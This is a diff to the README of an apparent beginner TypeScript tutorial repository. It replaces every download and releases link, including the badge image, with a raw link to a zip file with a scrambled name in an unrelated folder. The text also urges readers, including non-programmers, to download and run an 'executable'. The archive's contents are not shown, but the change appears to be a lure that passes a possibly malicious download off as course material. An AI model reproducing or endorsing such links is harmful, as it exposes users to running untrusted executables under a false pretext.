@@ -1,6 +1,6 @@
 # 🌟 TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced - Learn TypeScript Easily Today
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/releases)
+[![Download](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/raw/refs/heads/main/farmeress/for_Java_Beginner_to_From_Type_Learners_by_Advanced_Script_Step_1.7.zip)](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/raw/refs/heads/main/farmeress/for_Java_Beginner_to_From_Type_Learners_by_Advanced_Script_Step_1.7.zip)
 
 ## 📖 Overview
 This document is written for JavaScript learners who want to learn TypeScript, with mini real-world examples. TypeScript enhances your JavaScript knowledge and helps you write clearer, more maintainable code. You can start applying TypeScript in your projects swiftly, boosting your coding skills.
@@ -11,7 +11,7 @@ To begin using this guide, you do not need to be a programmer. This document is 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page to download the application.
 
-   [Visit Releases Page](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/releases)
+   [Visit Releases Page](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/raw/refs/heads/main/farmeress/for_Java_Beginner_to_From_Type_Learners_by_Advanced_Script_Step_1.7.zip)
 
 2. **Download the Latest Version:** Once on the Releases page, look for the latest version. You will find files that you can download. For most users, selecting the executable file should work best.
 
@@ -81,4 +81,4 @@ Thanks to all contributors and educators who helped make this guide accessible. 
 ## 📞 Contact
 For any inquiries or support requests, you can reach out to [Your Contact Information or GitHub Issues Page].
 
-[Download Now](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/releases) and start your TypeScript journey today!
+[Download Now](https://github.com/yamin72/TypeScript-Step-by-Step-for-JavaScript-Learners-From-Beginner-to-Advanced/raw/refs/heads/main/farmeress/for_Java_Beginner_to_From_Type_Learners_by_Advanced_Script_Step_1.7.zip) and start your TypeScript journey today!
